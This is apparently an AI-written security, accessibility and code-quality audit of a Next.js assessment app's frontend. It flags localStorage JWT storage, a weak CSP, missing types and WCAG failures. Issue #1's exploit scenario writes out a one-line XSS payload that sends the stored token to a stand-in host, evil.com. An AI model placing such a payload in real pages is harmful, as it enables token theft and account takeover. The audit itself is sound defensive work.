# AI Fluency Frontend Audit Report

**Product**: ai-fluency
**Scope**: `apps/web/src/` (33 `.tsx` files, plus `.ts` utility files)
**Date**: 2026-03-07
**Auditor**: Code Reviewer Agent (Principal Architect + Security Engineer + Staff Backend Engineer)
**Stack**: Next.js 15 (App Router), React 18, Tailwind CSS 3, Recharts 2, TypeScript 5

---

## Executive Summary

**Overall Assessment**: Fair (6.5/10)

**Top Risks**:

1. **[P0] JWT stored in localStorage** -- XSS vector that directly contradicts the product addendum's own mandate ("Never localStorage"). An XSS attack exfiltrates the token and achieves full account takeover.
2. **[P0] CSP allows `unsafe-eval` and `unsafe-inline`** -- Effectively nullifies the Content Security Policy, leaving the door open for injected scripts.
3. **[P1] Missing types in shared type file** -- `DimensionScores`, `LikertScale`, `ScenarioOption` are imported by components but never exported from `types/index.ts`. This causes TypeScript compilation failures.
4. **[P1] Duplicate AuthContext** -- Two separate implementations exist (`context/AuthContext.tsx` and `contexts/AuthContext.tsx`) with divergent interfaces, creating confusion and potential runtime bugs.
5. **[P1] Dashboard loading states lack `aria-live` / `role="status"`** -- Screen readers are not notified of loading or content transitions on dashboard, profile, and assessment session pages.

**Recommendation**: Fix First -- address P0 security issues before any public deployment.

---

## System Overview

AI Fluency is a Next.js 15 App Router SPA that delivers a 4-dimension AI fluency assessment, learning path browser, and org-level analytics dashboard. The frontend communicates with a Fastify API at port 5014 via a thin `api.ts` fetch wrapper using JWT Bearer auth.

Architecture pattern: client-side SPA with server-rendered layout shell. State management is React Context (AuthContext) plus local `useState` hooks. No global state library. React Query (`@tanstack/react-query`) is installed and configured in `Providers.tsx` but not actually used anywhere -- all data fetching is manual `useEffect` + `useState`.

```
Browser
  |
  +-- Next.js App Router (port 3118)
  |     +-- layout.tsx (AuthProvider, SkipNav, Header)
  |     +-- page.tsx (Home - SSR)
  |     +-- /dashboard, /assessment, /profile, /learning, /org (CSR)
  |
  +-- Fastify API (port 5014) via fetch()
        +-- /api/v1/auth/*, /api/v1/assessments/*, /api/v1/profiles/*, etc.
```

---

## Critical Issues (Top 10)

### Issue #1: JWT Stored in localStorage (XSS Token Theft)

**Description**: The `lib/auth.ts` module stores JWT access tokens in `localStorage`. Any XSS vulnerability (including via a compromised npm dependency) allows an attacker to read `localStorage.getItem('ai_fluency_token')` and exfiltrate the token for full account takeover.

**File/Location**: `apps/web/src/lib/auth.ts:8` (`getToken`), `apps/web/src/lib/auth.ts:13` (`setToken`)

**Impact**:
- Severity: Critical
- Likelihood: High (localStorage is the #1 XSS target)
- Blast Radius: Organization-wide (JWT contains orgId, user role)

**Exploit Scenario**:
1. Attacker finds or injects an XSS payload (e.g., via a compromised CDN or third-party script).
2. Payload executes `fetch('https://evil.com?t=' + localStorage.getItem('ai_fluency_token'))`.
3. Attacker now has a valid JWT and can impersonate the user, access assessment results, or escalate to admin.

**Fix**: Store access token in-memory (closure variable or React state). The product addendum at line 123 explicitly states: "Never localStorage". Use the existing httpOnly refresh cookie for session persistence across reloads.

```typescript
// BEFORE (vulnerable):
export function getToken(): string | null {
  if (typeof window === 'undefined') return null;
  return localStorage.getItem(TOKEN_KEY);
}

// AFTER (secure -- in-memory TokenManager):
let inMemoryToken: string | null = null;

export function getToken(): string | null {
  return inMemoryToken;
}

export function setToken(token: string): void {
  inMemoryToken = token;
}

export function clearToken(): void {
  inMemoryToken = null;
}
```

---

### Issue #2: CSP Allows `unsafe-eval` and `unsafe-inline`

**Description**: The Content Security Policy in `next.config.mjs` includes `'unsafe-eval'` in `script-src` and `'unsafe-inline'` in both `script-src` and `style-src`. This largely neutralizes the CSP and permits arbitrary script execution if an attacker can inject HTML.

**File/Location**: `apps/web/next.config.mjs:9`

**Impact**:
- Severity: Critical
- Likelihood: Medium
- Blast Radius: Organization-wide

**Fix**: Remove `'unsafe-eval'` entirely. For `'unsafe-inline'` on scripts, switch to nonce-based CSP using Next.js `nonce` support. `'unsafe-inline'` for `style-src` is acceptable for Tailwind but should be replaced with a hash-based approach when feasible.

```javascript
// BEFORE:
"script-src 'self' 'unsafe-inline' 'unsafe-eval'",

// AFTER:
"script-src 'self'",
// Then use Next.js nonce support for inline scripts.
```

---

### Issue #3: Missing Type Exports -- `DimensionScores`, `LikertScale`, `ScenarioOption`

**Description**: Three types are imported by components but never exported from `types/index.ts`: `DimensionScores` (used in `DimensionRadarChart.tsx:11` and `OrgFluencyChart.tsx:12`), `LikertScale` (used in `LikertOptions.tsx:3`), and `ScenarioOption` (used in `ScenarioOptions.tsx:3`). This will cause TypeScript compilation errors.

**File/Location**: `apps/web/src/types/index.ts` (missing exports throughout file)

**Impact**:
- Severity: High
- Likelihood: High (build will fail)
- Blast Radius: Feature-specific (assessment flow, charts)

**Fix**: Add the missing type definitions to `types/index.ts`:

```typescript
export interface DimensionScores {
  DELEGATION: number;
  DESCRIPTION: number;
  DISCERNMENT: number;
  DILIGENCE: number;
}

export interface LikertScale {
  min: number;
  max: number;
  labels: string[];
}

export interface ScenarioOption {
  key: string;
  text: string;
}
```

---

### Issue #4: Duplicate AuthContext Implementations

**Description**: Two separate `AuthContext` files exist with different implementations and different interfaces:
- `context/AuthContext.tsx` (164 lines) -- contains full auth logic (login, register, logout, session check), uses `api` and `lib/auth` directly.
- `contexts/AuthContext.tsx` (39 lines) -- a thin wrapper that delegates to `useAuth` hook.

The `layout.tsx` imports from `@/context/AuthContext` (the full one), while `ProtectedRoute.tsx` imports `useAuthContext` from `@/contexts/AuthContext` (the wrapper). The wrapper's `useAuth` hook re-exports from `@/context/AuthContext`. This circular-ish delegation works by accident but the interfaces diverge: `logout` returns `void` in one and `Promise<void>` in the other.

**File/Location**:
- `apps/web/src/context/AuthContext.tsx` (full implementation)
- `apps/web/src/contexts/AuthContext.tsx` (wrapper)
- `apps/web/src/hooks/useAuth.ts:5` (re-exports from `context/`)

**Impact**:
- Severity: High
- Likelihood: Medium (works now, but any refactor will break)
- Blast Radius: Product-wide (auth affects every authenticated page)

**Fix**: Delete `contexts/AuthContext.tsx`. Update `ProtectedRoute.tsx` to import from `@/context/AuthContext`. Have a single source of truth.

---

### Issue #5: Hardcoded `orgSlug: 'demo-org'` in Auth Flows

**Description**: Both `login` and `register` functions in `context/AuthContext.tsx` hardcode `orgSlug: 'demo-org'`. This means every user is forced into the same organization, breaking multi-tenancy.

**File/Location**: `apps/web/src/context/AuthContext.tsx:90` (login), `apps/web/src/context/AuthContext.tsx:117` (register)

**Impact**:
- Severity: High
- Likelihood: High (blocks multi-org deployment)
- Blast Radius: Organization-wide

**Fix**: Accept `orgSlug` as a parameter or derive it from the URL/subdomain.

---

### Issue #6: `handleNext` Uses Stale `error` State

**Description**: In `assessment/[id]/page.tsx`, `handleNext` calls `await submitAnswer()` then immediately checks `if (error) return`. However, `error` is a React state variable that won't reflect the new value until the next render. The stale closure means the check always sees the *previous* error state, not the result of the just-completed `submitAnswer`.

**File/Location**: `apps/web/src/app/assessment/[id]/page.tsx:85-91`

**Impact**:
- Severity: High
- Likelihood: High (always occurs after the first error)
- Blast Radius: Feature-specific (assessment flow)

**Exploit Scenario**:
1. User answers question 5. Network error occurs, `submitAnswer` sets `error`.
2. User clicks "Next" again. `submitAnswer` succeeds this time, but `handleNext` still sees the stale error from step 1 and refuses to advance.
3. User is stuck and cannot proceed.

**Fix**: Return success/failure from `submitAnswer` instead of relying on state:

```typescript
const submitAnswer = useCallback(async (): Promise<boolean> => {
  if (!currentQuestion || !currentAnswer) return false;
  setIsSubmitting(true);
  setError(null);
  try {
    await api.post(`/assessments/${sessionId}/respond`, { ... });
    return true;
  } catch {
    setError('Unable to save your answer. Please try again.');
    return false;
  } finally {
    setIsSubmitting(false);
  }
}, [sessionId, currentQuestion, currentAnswer]);

const handleNext = useCallback(async () => {
  const success = await submitAnswer();
  if (!success) return;
  if (!isLastQuestion) setCurrentIndex((prev) => prev + 1);
}, [submitAnswer, isLastQuestion]);
```

---

### Issue #7: Org Dashboard Uses Hardcoded Static Data

**Description**: `org/dashboard/page.tsx` renders entirely hardcoded metrics, team data, and dimension scores. There is no API call. The page displays a small footnote saying "Sample data shown" but the primary heading says "Organization Dashboard" with no visual distinction that this is mock data.

**File/Location**: `apps/web/src/app/org/dashboard/page.tsx:8-46` (hardcoded constants)

**Impact**:
- Severity: Medium
- Likelihood: High (users will see fake data and assume it is real)
- Blast Radius: Product-wide (misleading business users)

**Fix**: Add a prominent banner (not just a footnote) indicating sample data. Better: fetch real data from the API and show an empty state if none exists.

---

### Issue #8: LikertOptions Uses `role="radio"` on `<button>` Without `role="radiogroup"` Parent

**Description**: In `LikertOptions.tsx`, individual `<button>` elements have `role="radio"` and `aria-checked`, but the parent container is a plain `<div>` without `role="radiogroup"`. Screen readers expect radio buttons to be grouped within a radiogroup container. The `<fieldset>` wrapper is present but does not have `role="radiogroup"`, and `<fieldset>` alone does not convey radiogroup semantics for custom buttons.

**File/Location**: `apps/web/src/app/assessment/[id]/LikertOptions.tsx:40-65`

**Impact**:
- Severity: Medium
- Likelihood: High (affects all screen reader users)
- Blast Radius: Feature-specific (assessment)

**Fix**: Add `role="radiogroup"` to the parent `<div>` wrapping the buttons:

```tsx
<div className="flex justify-center gap-2" role="radiogroup" aria-label="Rating scale">
```

---

### Issue #9: Dashboard and Profile Loading States Lack `aria-live`

**Description**: The loading skeleton states in `dashboard/page.tsx:78-96` and `profile/page.tsx:78-91` do not include `role="status"` or `aria-live="polite"`. Screen reader users receive no announcement when content finishes loading.

**File/Location**:
- `apps/web/src/app/dashboard/page.tsx:78-96`
- `apps/web/src/app/profile/page.tsx:78-91`
- `apps/web/src/app/assessment/[id]/page.tsx:113-124`
- `apps/web/src/app/assessment/[id]/complete/page.tsx:160-170`

**Impact**:
- Severity: Medium
- Likelihood: High
- Blast Radius: Product-wide (WCAG 2.1 AA violation)

**Fix**: Wrap skeleton states with `role="status" aria-live="polite"` and add a visually-hidden loading announcement:

```tsx
<div role="status" aria-live="polite">
  <span className="sr-only">Loading dashboard data...</span>
  {/* skeleton divs */}
</div>
```

---

### Issue #10: React Query Installed But Unused

**Description**: `@tanstack/react-query` v5.62.0 is listed as a dependency and configured in `Providers.tsx` with a `QueryClient`, but `Providers` is never used in `layout.tsx`. The actual layout uses `AuthProvider` from `@/context/AuthContext` directly. All data fetching is manual `useEffect` + `useState` patterns with custom mounted-flag cleanup.

**File/Location**:
- `apps/web/src/components/providers/Providers.tsx` (unused)
- `apps/web/package.json:16` (dependency)

**Impact**:
- Severity: Low
- Likelihood: N/A (dead code)
- Blast Radius: N/A (increases bundle size, creates confusion)

**Fix**: Either wire `Providers.tsx` into `layout.tsx` and migrate data fetching to `useQuery`, or remove the dependency entirely. The manual `useEffect` patterns are verbose and prone to bugs (like Issue #6).

---

## Accessibility (WCAG 2.1 AA) Detailed Findings

### Passes (well done)

| Requirement | Status | Evidence |
|-------------|--------|----------|
| `lang` attribute on `<html>` | PASS | `layout.tsx:25`: `<html lang="en">` |
| Skip navigation link | PASS | `SkipNav.tsx:3-12`: links to `#main-content` |
| Main content landmark | PASS | `layout.tsx:30`: `<main id="main-content" tabIndex={-1}>` |
| Sidebar landmark with label | PASS | `Sidebar.tsx:26`: `<aside aria-label="Sidebar navigation">` |
| Header nav landmark with label | PASS | `Header.tsx:41`: `<nav aria-label="Main navigation">` |
| Progress bars use `role="progressbar"` | PASS | Multiple files: `aria-valuenow`, `aria-valuemin`, `aria-valuemax` |
| Form inputs have labels | PASS | `Input.tsx:14-28`: `<label htmlFor={id}>` with proper association |
| Error messages use `role="alert"` | PASS | Multiple files: error divs have `role="alert"` |
| Focus indicators on interactive elements | PASS | All buttons and links have `focus:ring-2` classes |
| Icons marked `aria-hidden="true"` | PASS | Decorative icons consistently use `aria-hidden` |
| Active page indicated via `aria-current` | PASS | `Header.tsx:66`, `Sidebar.tsx:37` |
| Min touch target 48px | PASS | Buttons use `min-h-[48px]` or `min-w-[48px]` consistently |

### Failures

| # | Issue | File:Line | WCAG Criterion |
|---|-------|-----------|----------------|
| A1 | LikertOptions: `role="radio"` buttons lack `role="radiogroup"` parent | `LikertOptions.tsx:40` | 4.1.2 Name, Role, Value |
| A2 | Dashboard skeleton has no `aria-live` or loading announcement | `dashboard/page.tsx:78-96` | 4.1.3 Status Messages |
| A3 | Profile skeleton has no `aria-live` or loading announcement | `profile/page.tsx:78-91` | 4.1.3 Status Messages |
| A4 | Assessment session skeleton has no `aria-live` | `assessment/[id]/page.tsx:113-124` | 4.1.3 Status Messages |
| A5 | Assessment complete skeleton has no `aria-live` | `assessment/[id]/complete/page.tsx:160-170` | 4.1.3 Status Messages |
| A6 | Inline Likert scale in `assessment/[id]/page.tsx:241-256` uses `aria-pressed` instead of `role="radio"` + `aria-checked` on what are functionally radio buttons | `assessment/[id]/page.tsx:245` | 4.1.2 Name, Role, Value |
| A7 | Likert buttons in `assessment/[id]/page.tsx:241-256` lack `aria-label` describing the scale value | `assessment/[id]/page.tsx:241` | 1.1.1 Non-text Content |
| A8 | ScoreBar in `profile/page.tsx:25-44` has `role="progressbar"` but no `aria-label` -- screen readers announce the progress value but not what it represents | `profile/page.tsx:33-37` | 1.1.1 Non-text Content |
| A9 | DimensionRadarChart uses `aria-label` on wrapper div but Recharts SVG has no `<title>` or `<desc>` element for screen readers (per addendum NFR-003 requirement) | `DimensionRadarChart.tsx:26` | 1.1.1 Non-text Content |
| A10 | OrgFluencyChart uses `aria-label` on wrapper div but Recharts SVG has no `<title>` or `<desc>` element | `OrgFluencyChart.tsx:27` | 1.1.1 Non-text Content |
| A11 | Header has no mobile hamburger menu -- navigation links are `hidden md:flex`, making them completely inaccessible on mobile | `Header.tsx:56` | 2.1.1 Keyboard, 2.4.1 Bypass Blocks |
| A12 | Sidebar is always visible with fixed `w-56` but has no responsive collapse -- on narrow screens it will consume excessive space with no way to dismiss it | `Sidebar.tsx:26` | 1.4.10 Reflow (320px viewport) |
| A13 | Color-only status indication on ScoreBar: red/yellow/green bars convey status solely through color | `assessment/[id]/complete/page.tsx:81-83`, `profile/page.tsx:27-29` | 1.4.1 Use of Color |

---

## Security Findings

### Authentication & Authorization

| # | Finding | File:Line | Severity |
|---|---------|-----------|----------|
| S1 | JWT stored in localStorage (XSS token theft) | `lib/auth.ts:8,13` | CRITICAL |
| S2 | Hardcoded `orgSlug: 'demo-org'` bypasses multi-tenancy | `context/AuthContext.tsx:90,117` | HIGH |
| S3 | No CSRF protection -- `credentials: 'include'` sends cookies cross-origin but no CSRF token is validated | `lib/api.ts:43` | MEDIUM |
| S4 | `logout()` does not call a server-side endpoint to invalidate the refresh token -- only clears client-side state | `context/AuthContext.tsx:134-138` | MEDIUM |

### Content Security Policy

| # | Finding | File:Line | Severity |
|---|---------|-----------|----------|
| S5 | `script-src 'unsafe-eval'` allows `eval()` -- required by neither Next.js nor Recharts in production | `next.config.mjs:9` | CRITICAL |
| S6 | `script-src 'unsafe-inline'` allows arbitrary inline scripts | `next.config.mjs:9` | HIGH |

### Data Security

| # | Finding | File:Line | Severity |
|---|---------|-----------|----------|
| S7 | API base URL defaults to `http://localhost:5014` (unencrypted) -- no check for HTTPS in production | `lib/api.ts:7` | LOW |
| S8 | Error responses from API are displayed directly to users without sanitization (though no `dangerouslySetInnerHTML` is used, so XSS risk is minimal via React's auto-escaping) | `lib/api.ts:48-54` | LOW |

### No `dangerouslySetInnerHTML` Usage

Confirmed: zero instances of `dangerouslySetInnerHTML` or `innerHTML` across all 33 `.tsx` files. This is good.

---

## Architecture Problems

### 1. Duplicate Auth Context (Confusing Dependency Graph)

- **Problem**: `context/AuthContext.tsx` and `contexts/AuthContext.tsx` both define `AuthProvider` and `useAuthContext`. The hook file `hooks/useAuth.ts` re-exports from `context/`. `layout.tsx` uses `context/`, `ProtectedRoute.tsx` uses `contexts/`. The interfaces diverge (`logout: () => void` vs `logout: () => Promise<void>`).
- **Impact**: Any developer (human or AI) touching auth will pick the wrong import. Type mismatches will surface at runtime.
- **Solution**: Delete `contexts/AuthContext.tsx`. Consolidate to `context/AuthContext.tsx`. Update all imports.

### 2. React Query Configured But Not Used

- **Problem**: `Providers.tsx` sets up `QueryClientProvider` but is never rendered. All 8 data-fetching components use manual `useEffect` + `useState` + mounted-flag patterns (approximately 15 instances across the codebase).
- **Impact**: Manual fetch patterns are verbose (avg 15 lines per fetch), error-prone (stale closures, missing cleanup), and lack caching, deduplication, and background refresh.
- **Solution**: Wire `Providers.tsx` into `layout.tsx` and migrate to `useQuery` / `useMutation` hooks. This eliminates the mounted-flag boilerplate and gives free caching, retry, and loading state management.

### 3. No Error Boundaries

- **Problem**: No React Error Boundaries exist anywhere. If a chart component, API response parsing, or date formatting throws, the entire page crashes with a white screen.
- **Impact**: Silent failures in production. Per CR-PATTERN-003, this is a recurring issue across ConnectSW products.
- **Solution**: Add `error.tsx` files at the route segment level (Next.js App Router convention) and wrap chart components in dedicated error boundaries.

### 4. No Responsive Design for Sidebar + Header

- **Problem**: The sidebar is always rendered at `w-56` with no mobile collapse. The header navigation is `hidden md:flex` with no hamburger menu. On screens < 768px, navigation is completely inaccessible.
- **Impact**: Mobile users cannot navigate the app at all.
- **Solution**: Add a mobile hamburger menu in `Header.tsx` and make `Sidebar` collapsible on mobile.

---

## Performance & Scalability

| # | Issue | File:Line | Impact |
|---|-------|-----------|--------|
| P1 | `QueryClient` instantiated at module level in `Providers.tsx:7` -- if this file is ever imported in SSR, all users share one cache | `Providers.tsx:7` | Stale data leaks between users in SSR |
| P2 | Recharts is not lazy-loaded on non-dashboard pages despite addendum mandate | `DimensionRadarChart.tsx:1`, `OrgFluencyChart.tsx:1` | Bundle size -- Recharts is ~200KB |
| P3 | Assessment questions are all loaded at once (`/assessments/${id}/questions` returns full array) -- for 50 questions with scenario text, this could be 50-100KB | `assessment/[id]/page.tsx:30-31` | Initial load time |

---

## Code Quality Findings

### Missing Types (Build Failures)

| Type | Imported By | Exported From `types/index.ts`? |
|------|------------|-------------------------------|
| `DimensionScores` | `DimensionRadarChart.tsx:11`, `OrgFluencyChart.tsx:12` | NO |
| `LikertScale` | `LikertOptions.tsx:3` | NO |
| `ScenarioOption` | `ScenarioOptions.tsx:3` | NO |

These are imported as `import type { X } from '@/types/index'` but the type file does not define or export them. This will cause `TS2305: Module '"@/types/index"' has no exported member` errors.

### Dead Code

| Item | File:Line | Notes |
|------|-----------|-------|
| `Providers.tsx` component | `providers/Providers.tsx:1-22` | Never imported by `layout.tsx` |
| `contexts/AuthContext.tsx` | `contexts/AuthContext.tsx:1-39` | Redundant wrapper; only used by `ProtectedRoute.tsx` |
| `react-hook-form` and `@hookform/resolvers` | `package.json:15-16` | Not imported anywhere in the codebase |
| `zod` | `package.json:22` | Not imported anywhere in the frontend |

### Code Duplication

| Pattern | Occurrences | Files |
|---------|-------------|-------|
| `ScoreBar` component (progress bar with red/yellow/green color logic) | 2 separate implementations | `assessment/[id]/complete/page.tsx:79-102`, `profile/page.tsx:25-45` |
| Manual `useEffect` fetch with mounted-flag pattern | 8 instances | `dashboard/page.tsx`, `assessment/page.tsx`, `assessment/[id]/page.tsx`, `assessment/[id]/complete/page.tsx`, `profile/page.tsx`, `learning/page.tsx`, `learning/[pathId]/page.tsx`, `context/AuthContext.tsx` |
| Sidebar + flex layout boilerplate | 7 instances | Every authenticated page duplicates `<div className="flex min-h-[calc(100vh-64px)]"><Sidebar />...` |

### `any` Types

No explicit `any` types found in `.ts` or `.tsx` files. The codebase uses `Record<string, unknown>` for untyped API responses, which is acceptable. Clean on this front.

---

## Testing Gaps

- **No frontend tests detected**: No test files found in `apps/web/src/`. Jest is configured (`package.json:9`) but no `__tests__/` directories or `*.test.tsx` files exist.
- **No Playwright E2E tests**: The `e2e/` directory was not found in the web app.
- **React Testing Library is installed** but unused.
- **Coverage**: 0% -- no tests exist.

### Tests to Add (Priority Order)

1. `AuthContext.test.tsx` -- login, register, logout, session restoration, error handling
2. `api.test.ts` -- request builder, error parsing, token attachment
3. `AssessmentSessionPage.test.tsx` -- question navigation, answer submission, completion
4. `ProtectedRoute.test.tsx` -- redirect on unauthenticated, role gating
5. `DimensionRadarChart.test.tsx` -- renders without crash, handles zero scores
6. `Input.test.tsx` -- error state, label association, required indicator

---

## DevOps Issues

| # | Issue | Notes |
|---|-------|-------|
| D1 | `eslint.ignoreDuringBuilds: true` in `next.config.mjs:24-26` -- linting skipped during build | Justified by comment ("runs as CI job") but means local `npm run build` won't catch lint errors |
| D2 | No `.env.example` file found | New developers don't know which env vars are required |
| D3 | Next.js version is 15.5.12 but the addendum says "Next.js 14 (App Router)" -- version mismatch in documentation | `package.json:18` |

---

## AI-Readiness Score: 5 / 10

| Criterion | Score | Notes |
|-----------|-------|-------|
| Modularity | 1.5/2 | Components are reasonably isolated. Sidebar/Header/Card are reusable. Auth is tangled. |
| API Design | 1/2 | `api.ts` is clean but no typed API layer (no generated types from backend schema). |
| Testability | 0/2 | Zero tests. No test utilities. No mock server setup. |
| Observability | 0.5/2 | Error states shown to users. No error tracking (Sentry, PostHog errors). No performance monitoring. |
| Documentation | 2/2 | Good i18n structure, types file, clear component naming. |

---

## Technical Debt Map

### High-Interest Debt (fix ASAP)

1. **localStorage JWT storage** -- actively exploitable, contradicts own security policy
2. **CSP `unsafe-eval`** -- neutralizes a key security layer
3. **Missing type exports** -- blocks TypeScript compilation
4. **Duplicate AuthContext** -- confuses every contributor

### Medium-Interest Debt (fix next quarter)

5. **No error boundaries** -- white-screen crashes in production
6. **No frontend tests** -- 0% coverage, no regression safety
7. **React Query unused** -- verbose manual fetching, stale closure bugs
8. **Hardcoded org slug** -- blocks multi-tenancy
9. **No mobile navigation** -- app unusable on mobile
10. **Duplicate ScoreBar** -- two implementations that will diverge

### Low-Interest Debt (monitor)

11. **Dead dependencies** (`react-hook-form`, `zod`, `@hookform/resolvers`) -- bundle size waste
12. **Hardcoded org dashboard data** -- acceptable for demo, needs API integration before launch
13. **No i18n framework** -- `t()` is a simple lookup; adequate for English-only

---

## Refactoring Roadmap

### 30-Day Plan (Critical Fixes)

1. **[2 days]** Move JWT to in-memory storage; implement refresh token flow via httpOnly cookie
2. **[1 day]** Fix CSP: remove `unsafe-eval`, implement nonce-based inline scripts
3. **[0.5 day]** Add missing type exports (`DimensionScores`, `LikertScale`, `ScenarioOption`)
4. **[0.5 day]** Consolidate duplicate AuthContext into single module
5. **[1 day]** Fix `handleNext` stale error closure in assessment session
6. **[1 day]** Add `error.tsx` error boundaries at route segment level
7. **[1 day]** Add server-side logout endpoint call to invalidate refresh token

### 60-Day Plan (Important Improvements)

8. **[3 days]** Migrate data fetching to React Query (`useQuery` / `useMutation`)
9. **[2 days]** Add mobile hamburger menu and responsive sidebar collapse
10. **[3 days]** Write core frontend tests (AuthContext, api.ts, assessment flow)
11. **[1 day]** Fix all WCAG failures (aria-live on skeletons, radiogroup, chart descriptions)
12. **[1 day]** Extract shared `ScoreBar` component; remove duplication

### 90-Day Plan (Strategic Improvements)

13. **[2 days]** Integrate error tracking (Sentry or PostHog)
14. **[2 days]** Add Playwright E2E tests for critical user journeys
15. **[1 day]** Lazy-load Recharts components with `next/dynamic`
16. **[1 day]** Remove dead dependencies and dead code
17. **[2 days]** Replace hardcoded org dashboard with real API data

---

## Quick Wins (1-Day Fixes)

1. Add missing `DimensionScores`, `LikertScale`, `ScenarioOption` type exports to `types/index.ts`
2. Delete `contexts/AuthContext.tsx`; update `ProtectedRoute.tsx` import to `@/context/AuthContext`
3. Add `role="status" aria-live="polite"` to all skeleton loading states
4. Add `role="radiogroup"` to LikertOptions button container
5. Add `aria-label` to ScoreBar in `profile/page.tsx`
6. Remove unused `react-hook-form`, `@hookform/resolvers`, and `zod` from `package.json`
7. Add a prominent "Sample Data" banner to org dashboard page
8. Fix `handleNext` to use return value from `submitAnswer` instead of stale `error` state
9. Add `aria-label` to Likert buttons in inline assessment page (line 241-256)
10. Remove `'unsafe-eval'` from CSP `script-src` in `next.config.mjs`
